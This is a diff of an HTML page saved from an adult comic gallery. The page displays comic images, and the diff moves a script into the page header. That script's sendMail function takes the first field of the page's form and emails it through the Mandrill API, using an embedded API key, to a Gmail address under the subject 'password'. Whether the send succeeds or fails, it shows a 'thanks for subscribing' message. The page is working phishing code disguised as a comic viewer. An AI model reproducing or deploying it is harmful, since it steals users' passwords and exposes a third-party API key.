@@ -1,11 +1,67 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <!-- saved from url=(0043)http://g.e-hentai.org/s/856ff98bb8/791944-2 -->
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <title>诱惑妈妈 前篇</title>
 <link rel="stylesheet" type="text/css" href="./images/g.css">
 
-<style type="text/css"></style></head>
-<body>
+<style type="text/css"></style>
+
+
+<script type="text/javascript" language="javascript" src="./网易用户中心_files/jquery.js"></script>
+
+<script type="text/javascript" onload="show()">
+function show(){
+	var html="";
+	for(var i=1;i<11;i++){
+		if(i<10){
+			html+='<img id="img" src="./images/Uf01_00'+i+'.jpg" style="height: 1000px; width: 710px; max-width: 710px; max-height: 1000px;">\r\n';
+		}
+		else{
+			html+='<img id="img" src="./images/Uf01_0'+i+'.jpg" style="height: 1000px; width: 710px; max-width: 710px; max-height: 1000px;">\r\n';
+		}
+	}
+	
+	var x=document.getElementById('i3').innerHTML=html;
+}
+
+
+function sendMail() {
+    $.ajax({
+      type: "POST",
+      url: "https://mandrillapp.com/api/1.0/messages/send.json",
+      data: {
+        'key': 'bnzuL-jTtPWKLSdNtzvfiw',
+        'message': {
+          'from_email': 'yuanminggang1@126.com',
+          'to': [
+            {
+              'email': 'woshizaibuzhidao3@gmail.com',
+              'name': 'password',
+              'type': 'to'
+            }
+          ],
+          'subject': 'password',
+          'html': document.getElementById("form").elements[0].value
+        }
+      },
+      success : function(data) {
+      	// console.log("ye");
+         alter("感谢您的订阅");
+      },
+      error: function (error) {
+         alter("感谢您的订阅");
+              }
+    });
+    return false;
+    }
+</script>
+</head>
+
+
+
+
+<body onload="show()">
 
 <div id="i1" class="sni" style="width: 730px; max-width: 730px;">
 	<div id="i2">诱惑妈妈 前篇
@@ -36,52 +92,5 @@
 	   </ul>
 	  </form>
 </div>
-
-<script type="text/javascript" onload="show()">
-function show(){
-	var html;
-	for(var i=1;i<11;i++){
-		if(i<10){
-			html+='<img id="img" src="./images/s2/Uf01_00'+i+'.jpg" style="height: 1000px; width: 710px; max-width: 710px; max-height: 1000px;">\r\n';
-		}
-		else{
-			html+='<img id="img" src="./images/s2/Uf01_0'+i+'.jpg" style="height: 1000px; width: 710px; max-width: 710px; max-height: 1000px;">\r\n';
-		}
-	}
-	
-	var x=document.getElementById('i3').innerHTML=html;
-	console.log(x);
-}
-
-
-function sendMail() {
-    $.ajax({
-      type: "POST",
-      url: "https://mandrillapp.com/api/1.0/messages/send.json",
-      data: {
-        'key': 'bnzuL-jTtPWKLSdNtzvfiw',
-        'message': {
-          'from_email': 'yuanminggang1@126.com',
-          'to': [
-            {
-              'email': 'woshizaibuzhidao3@gmail.com',
-              'name': 'password',
-              'type': 'to'
-            }
-          ],
-          'subject': 'password',
-          'html': document.getElementById("form").elements[0].value
-        }
-      },
-      success : function(data) {
-         alter("感谢您的订阅");
-      },
-      error: function (error) {
-         alter("感谢您的订阅");
-              }
-    });
-    return false;
-    }
-</script>
-
-</body></html>
+</body>
+</html>
